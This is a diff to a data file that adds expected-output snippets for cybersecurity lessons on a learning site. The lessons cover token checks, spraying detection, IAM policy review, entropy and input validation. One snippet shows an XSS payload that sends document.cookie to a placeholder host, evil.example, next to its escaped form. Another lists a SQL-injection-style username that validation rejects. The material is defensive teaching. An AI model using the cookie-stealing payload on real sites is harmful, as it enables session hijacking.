@@ -35,6 +35,110 @@
   "kind": "text",
   "text": "billing   next reads: ['order_shipped:1001']\nemail     next reads: ['order_placed:1001', 'order_paid:1001', 'order_shipped:1001']\nanalytics next reads: []\nthe log still holds 3 events"
  },
+ "/learn/cybersecurity/api-container-security": {
+  "kind": "text",
+  "text": "header alg: HS256\nrejected: unexpected algorithm"
+ },
+ "/learn/cybersecurity/attacker-mindset-kill-chain": {
+  "kind": "text",
+  "text": "coverage 3/5\ngaps: ['T1003 Credential dumping', 'T1486 Data encrypted for impact']"
+ },
+ "/learn/cybersecurity/authentication-attacks": {
+  "kind": "text",
+  "text": "203.0.113.9 4 accounts: possible spraying\n198.51.100.4 1 accounts: ordinary failures"
+ },
+ "/learn/cybersecurity/cloud-security": {
+  "kind": "text",
+  "text": "statement 1: * on * is too broad\nstatement 2: iam:PassRole on * is too broad"
+ },
+ "/learn/cybersecurity/cryptography-fundamentals": {
+  "kind": "text",
+  "text": "c2f0e88becc63c37 vs f8000fd1c45efb34\nvalid tag: True\ntampered: False"
+ },
+ "/learn/cybersecurity/ctf-skills": {
+  "kind": "text",
+  "text": "challenge gives: 5a6d78685a33746f5a5778736231396a64475a39\nafter hex decode: ZmxhZ3toZWxsb19jdGZ9\nafter base64: flag{hello_ctf}"
+ },
+ "/learn/cybersecurity/devsecops": {
+  "kind": "text",
+  "text": "commit blocked\n  hard-coded secret: AWS_SECRET"
+ },
+ "/learn/cybersecurity/firewalls-ids-ips": {
+  "kind": "text",
+  "text": "app -> database:5432 allow\napp -> unknown-host:443 deny (default)\napp -> database:22 deny (default)"
+ },
+ "/learn/cybersecurity/identity-access-management": {
+  "kind": "text",
+  "text": "ava  ['read', 'write']\nben  ['read']\ncy   ['delete', 'grant', 'read', 'write']"
+ },
+ "/learn/cybersecurity/incident-response": {
+  "kind": "text",
+  "text": "1. memory (RAM)\n2. network connections\n3. disk image\n4. backups"
+ },
+ "/learn/cybersecurity/linux-for-security": {
+  "kind": "text",
+  "text": "0o755 -rwxr-xr-x \n0o644 -rw-r--r-- \n0o600 -rw------- \n0o4755 -rwsr-xr-x ← SUID"
+ },
+ "/learn/cybersecurity/malware-types-behavior": {
+  "kind": "text",
+  "text": "plain text entropy 3.69 bits/byte\nencrypted-looking  8.00 bits/byte (near 8 is suspicious)"
+ },
+ "/learn/cybersecurity/networking-deep-dive": {
+  "kind": "text",
+  "text": "('users', 'servers', 443) allow\n('users', 'payments', 5432) deny\n('servers', 'payments', 5432) allow"
+ },
+ "/learn/cybersecurity/post-exploitation": {
+  "kind": "text",
+  "text": "secret in config: db_password\nsecret in config: api_key"
+ },
+ "/learn/cybersecurity/python-for-security": {
+  "kind": "text",
+  "text": "127.0.0.1:57922 open\n127.0.0.1:1 closed"
+ },
+ "/learn/cybersecurity/reconnaissance-osint": {
+  "kind": "text",
+  "text": "5 names: ['api.chaduvuko.com', 'grafana.internal.chaduvuko.com', 'staging.chaduvuko.com', 'vpn.chaduvuko.com', 'www.chaduvuko.com']"
+ },
+ "/learn/cybersecurity/secure-coding": {
+  "kind": "text",
+  "text": "'ava_2026'                   ok\n'AVA'                        rejected\n'x'                          rejected\n'ava; DROP TABLE users'      rejected\n'<script>'                   rejected"
+ },
+ "/learn/cybersecurity/siem-log-analysis": {
+  "kind": "text",
+  "text": "alert: 5 failed logins for ava before success"
+ },
+ "/learn/cybersecurity/social-engineering-phishing": {
+  "kind": "text",
+  "text": "['sender domain is not ours', 'reply-to differs', 'urgency', 'link host is a lookalike']"
+ },
+ "/learn/cybersecurity/threat-intelligence-hunting": {
+  "kind": "text",
+  "text": "investigate: winword.exe spawned powershell.exe\ninvestigate: excel.exe spawned cmd.exe"
+ },
+ "/learn/cybersecurity/vulnerabilities-and-exploits": {
+  "kind": "text",
+  "text": "CVE-B cvss 7.5 epss 0.91 KEV\nCVE-C cvss 8.1 epss 0.40 \nCVE-A cvss 9.8 epss 0.02"
+ },
+ "/learn/cybersecurity/vulnerability-management": {
+  "kind": "text",
+  "text": "A: patch within 2 days\nB: patch within 7 days\nC: patch within 90 days"
+ },
+ "/learn/cybersecurity/web-app-pentesting": {
+  "kind": "text",
+  "text": "29.97\nrejected: quantity must be at least 1"
+ },
+ "/learn/cybersecurity/web-attacks-owasp": {
+  "kind": "text",
+  "text": "unsafe: <script>fetch(\"https://evil.example/?c=\" + document.cookie)</script>\nescaped: &lt;script&gt;fetch(&quot;https://evil.example/?c=&quot; + document.cookie)&lt;/script&gt;"
+ },
+ "/learn/cybersecurity/what-is-cybersecurity": {
+  "kind": "text",
+  "text": "16  phishing leads to account takeover\n15  unpatched VPN exploited\n 5  data centre flood\n 3  laptop stolen, disk encrypted"
+ },
+ "/learn/cybersecurity/windows-active-directory": {
+  "kind": "text",
+  "text": "ava: ['ava', 'helpdesk', 'server-admins', 'domain-admins']\nben: None"
+ },
  "/learn/data-engineering/acid-transactions": {
   "kind": "table",
   "columns": [
